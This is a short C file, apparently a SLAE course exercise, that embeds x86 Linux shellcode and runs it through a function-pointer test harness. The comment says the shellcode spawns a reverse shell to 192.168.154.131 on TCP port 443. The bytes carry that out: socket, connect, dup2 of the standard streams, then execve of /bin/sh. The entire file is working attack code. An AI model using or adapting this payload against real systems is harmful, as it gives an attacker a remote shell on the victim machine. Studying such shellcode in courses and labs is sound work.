#include<stdio.h>
#include<string.h>

unsigned char code[] = \

//**Spawning reverse shell to IP 192.168.154.131 on TCP port 443**//
//**SLAE-1122**//

"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xff\xb0\x66\xb3\x03\x68\xc0\xa8\x9a\x83\x66\x68\x01\xbb\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x89\xd3\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9\x03\x74\x02\xeb\xf3\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

